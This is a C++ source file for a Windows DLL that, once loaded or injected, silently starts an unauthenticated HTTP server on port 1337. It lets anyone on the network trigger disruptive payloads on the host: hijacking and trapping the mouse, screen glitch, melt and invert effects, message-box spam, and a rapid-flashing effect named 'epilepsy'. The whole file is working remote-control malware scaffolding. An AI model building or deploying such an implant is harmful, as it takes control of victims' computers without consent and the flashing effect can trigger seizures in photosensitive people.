#include "httplib.h"
#include <Windows.h>
#include <map>
#include <string>
#include "payloads.h"

#define EXPORT extern "C" __declspec(dllexport)

#define THR(x) ((PTHREAD_START_ROUTINE) x)

std:: map<std::string, void (*)()> funcMap;

struct PayloadInfo {
	std::string payload;
	int durationSec;
	int delayMs;
};

int WINAPI payloadThread(PayloadInfo* info) {

	time_t start = time(0);
	time_t now = 0;

	if (funcMap[info->payload] != nullptr) {
		GetCursorPos(&payload::mouse);
		while (start + info->durationSec > now) {
			funcMap[info->payload]();
			Sleep(info->delayMs);
			time(&now);
		}
	}

	delete info;
	return 0;
}

int WINAPI thread(HMODULE hmodule) {

	using namespace httplib;

	Server svr;
	payload::init();

	funcMap = {
		{ "mouse", payload::moveMouse },
		{ "glitch", payload::screenGlitch },
		{ "tunnel", payload::screenTunnel },
		{ "invert", payload::screenInvert },
		{ "errorcursor", payload::drawErrorCursor },
		{ "melt", payload::melt },
		{ "epilepsy", payload::epilepsy },
		{ "trapmouse", payload::trapMouse },
		{ "msgboxmousefollow", payload::msgboxmousefollow },
		{ "drawtext", payload::drawText },
	};

	svr.Get(R"(/run)", [](const Request& req, Response& res) {
		if (req.has_param("payload") && req.has_param("duration") && req.has_param("delay")) {
			PayloadInfo* info = new PayloadInfo();

			info->payload = req.get_param_value("payload");
			info->durationSec = atoi(req.get_param_value("duration").c_str());
			info->delayMs = atoi(req.get_param_value("delay").c_str());

			CreateThread(0, 0, THR(payloadThread), info, 0, 0);

			res.set_content("ok", "text/html");
		}
	});

	svr.Get("/stop", [&](const Request& req, Response& res) {
		FreeLibraryAndExitThread(hmodule, 0);
		CloseHandle(hmodule);
	});

	svr.set_error_handler([](const Request& req, Response& res) {
		char buf[BUFSIZ];
		snprintf(buf, BUFSIZ, "<p>Error Status: <span style='color:red;'>%d</span></p>", res.status);
		res.set_content(buf, "text/html");
	});

	svr.listen("0.0.0.0", 1337);

	return 1;
}

int WINAPI DllMain(HMODULE hModule, DWORD reason, void*) {
	DisableThreadLibraryCalls(hModule);
	if (reason == 1)
		CreateThread(0, 0, THR(thread), hModule, 0, 0);
	return 1;
}